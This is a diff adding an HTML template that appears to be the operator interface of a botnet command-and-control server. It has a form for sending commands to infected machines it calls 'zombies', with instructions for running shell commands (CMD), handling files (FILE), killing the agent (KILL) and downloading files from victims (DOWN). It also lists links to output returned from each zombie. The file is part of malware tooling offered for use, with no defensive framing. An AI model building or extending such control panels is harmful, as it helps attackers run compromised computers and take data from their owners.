@@ -1,0 +1,35 @@
+<html>
+	<body>
+	<h1> commands here </h1>
+	<form action="" method="POST">
+		<input type="text" placeholder="Command" name="command" value="{{
+			request.form.command }}">
+		<input class="btn btn-default" type="submit" value=";)">
+	</form>
+	{% if message %}
+	<p>Message: {{ message }}</p>
+	{% endif %}
+
+	<h3>Directions:</h3>
+	<p>CMD:_Command With Spaces_</p>
+	<p>FILE:_FileName_</p>
+	<p>KILL:kill</p>
+	<p>DOWN:_Path_to_file</p>
+
+	<h3>Output From Zombie</h3>
+	{% for x in d %}
+	<a href="http://localhost:8080/admin/{{z}}/{{x[0]}}">Output: {{x[0]}}</a>
+	<br>
+	{% endfor %}
+
+	{% if z %}
+	<h4><a href="http://localhost:8080/admin/{{z}}/">Refresh</a></h4>
+	{% endif %}
+	<br><br>
+	<a href="http://localhost:8080/admin/zombies">Return to Zombies</a>
+
+
+
+	</body>
+
+</html>
